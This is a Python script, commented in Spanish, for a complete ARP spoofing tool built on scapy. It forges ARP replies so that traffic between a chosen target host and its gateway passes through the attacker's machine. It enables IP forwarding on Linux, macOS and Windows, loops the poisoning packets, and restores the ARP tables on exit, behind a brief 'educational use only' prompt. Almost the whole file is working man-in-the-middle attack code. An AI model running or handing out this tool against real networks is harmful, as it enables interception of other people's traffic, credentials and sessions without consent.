
import argparse
import time
import sys
import signal
import scapy.all as scapy
from threading import Event


try:
    input = raw_input
except NameError:
    pass


def signal_handler(sig, frame):
    print("\n[!] Deteniendo ARP spoofing...")
    sys.exit(0)

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer - Intercepta tráfico entre dos hosts")
    parser.add_argument("-t", "--target", required=True, dest="target_ip", 
                       help="IP del objetivo a spoofear")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", default="192.168.1.1",
                       help="IP del gateway/router (por defecto: 192.168.1.1)")
    parser.add_argument("-i", "--interface", dest="interface", default=None,
                       help="Interfaz de red a usar")
    parser.add_argument("-s", "--spoof-mac", dest="spoof_mac", default=None,
                       help="MAC address falsa a usar (opcional)")
    parser.add_argument("-d", "--delay", dest="delay", type=float, default=2.0,
                       help="Delay entre paquetes ARP (por defecto: 2 segundos)")
    return parser.parse_args()

def get_mac(ip):
    """Obtiene la dirección MAC de una IP mediante ARP request"""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[!] No se pudo obtener la MAC de {ip}")
        return None

def restore_arp_tables(target_ip, gateway_ip):
    """Restaura las tablas ARP a su estado original"""
    print(f"\n[+] Restaurando tablas ARP...")
    
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if target_mac and gateway_mac:

        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                          psrc=gateway_ip, hwsrc=gateway_mac)
        scapy.send(packet, count=4, verbose=False)
        
  
        packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, 
                          psrc=target_ip, hwsrc=target_mac)
        scapy.send(packet, count=4, verbose=False)
        
        print(f"[✓] Tablas ARP restauradas exitosamente")
    else:
        print(f"[!] No se pudieron restaurar completamente las tablas ARP")

def spoof(target_ip, target_mac, spoof_ip, spoof_mac, spoof_mac_src=None):
    """Envía paquete ARP spoofed"""
    if spoof_mac_src:
 
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                          psrc=spoof_ip, hwsrc=spoof_mac_src)
    else:

        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    scapy.send(packet, verbose=False)

def enable_ip_forwarding():
    """Habilita el forwarding de IP para permitir que el tráfico fluya"""
    import platform
    system = platform.system()
    
    if system == "Linux":
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:
            file.write('1')
        print("[+] IP forwarding habilitado en Linux")
    elif system == "Darwin":  
        import subprocess
        subprocess.call(['sysctl', '-w', 'net.inet.ip.forwarding=1'])
        print("[+] IP forwarding habilitado en macOS")
    elif system == "Windows":
        import subprocess
        subprocess.call(['netsh', 'interface', 'ipv4', 'set', 'interface', 
                        'name="Ethernet"', 'forwarding=enabled'], shell=True)
        print("[+] IP forwarding habilitado en Windows (puede requerir admin)")
    else:
        print(f"[!] Sistema operativo {system} no soportado para auto-forwarding")

def print_banner():
    
    banner = """
    █████╗ ██████╗ ██████╗      ███████╗██████╗  ██████╗ ██████╗ ███████╗██████╗
    ██╔══██╗██╔══██╗██╔══██╗     ██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝██╔══██╗
    ███████║██████╔╝██████╔╝     █████╗ ██████╔╝██║   ██║██████╔╝█████╗  ██████╔╝
    ██╔══██║██╔═══╝ ██╔═══╝
        ██╔══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██╔══██╗        
    ██║  ██║██║     ██║   ██║██████╔╝███████╗██████╔╝███████╗██████╔╝




    """
    print(banner)

def confirm_execution():
    """Pide confirmación antes de ejecutar"""
    print("[!] ADVERTENCIA: Este script realiza ARP spoofing.")
    print("[!] Solo use en redes propias con fines educativos.")
    print("[!] El uso no autorizado es ILEGAL.")
    print("\n" + "═" * 50)
    
    response = input("\n¿Continuar? (si/no): ").lower().strip()
    return response == 'si' or response == 's'

def main():

    signal.signal(signal.SIGINT, signal_handler)
    
 
    print_banner()
    

    if not confirm_execution():
        print("[!] Ejecución cancelada por el usuario.")
        sys.exit(0)
    

    args = get_arguments()
    
    print(f"[+] Target IP: {args.target_ip}")
    print(f"[+] Gateway IP: {args.gateway_ip}")
    print(f"[+] Delay: {args.delay} segundos")
    

    try:
        enable_ip_forwarding()
    except Exception as e:
        print(f"[!] No se pudo habilitar IP forwarding: {e}")
        print("[!] El tráfico puede no fluir correctamente.")
    

    print("\n[+] Obteniendo MAC addresses...")
    target_mac = get_mac(args.target_ip)
    gateway_mac = get_mac(args.gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[!] No se pudieron obtener todas las MAC addresses necesarias.")
        sys.exit(1)
    
    print(f"[✓] Target MAC: {target_mac}")
    print(f"[✓] Gateway MAC: {gateway_mac}")
    
    sent_packets = 0
    print("\n[+] Iniciando ARP spoofing...")
    print("[!] Presiona Ctrl+C para detener y restaurar\n")
    
    try:
        while True:
 
            spoof(args.target_ip, target_mac, args.gateway_ip, gateway_mac, args.spoof_mac)
            

            spoof(args.gateway_ip, gateway_mac, args.target_ip, target_mac, args.spoof_mac)
            
            sent_packets += 2
            
      
            if sent_packets % 10 == 0:
                print(f"\r[+] Paquetes enviados: {sent_packets}", end="")
                sys.stdout.flush()
            
            time.sleep(args.delay)
            
    except KeyboardInterrupt:
        print(f"\n\n[!] Interrumpido por el usuario")
        print(f"[+] Total de paquetes enviados: {sent_packets}")
    except Exception as e:
        print(f"\n[!] Error: {e}")
    finally:

        restore_arp_tables(args.target_ip, args.gateway_ip)

        print("[+] Script finalizado.")

if __name__ == "__main__":
    main()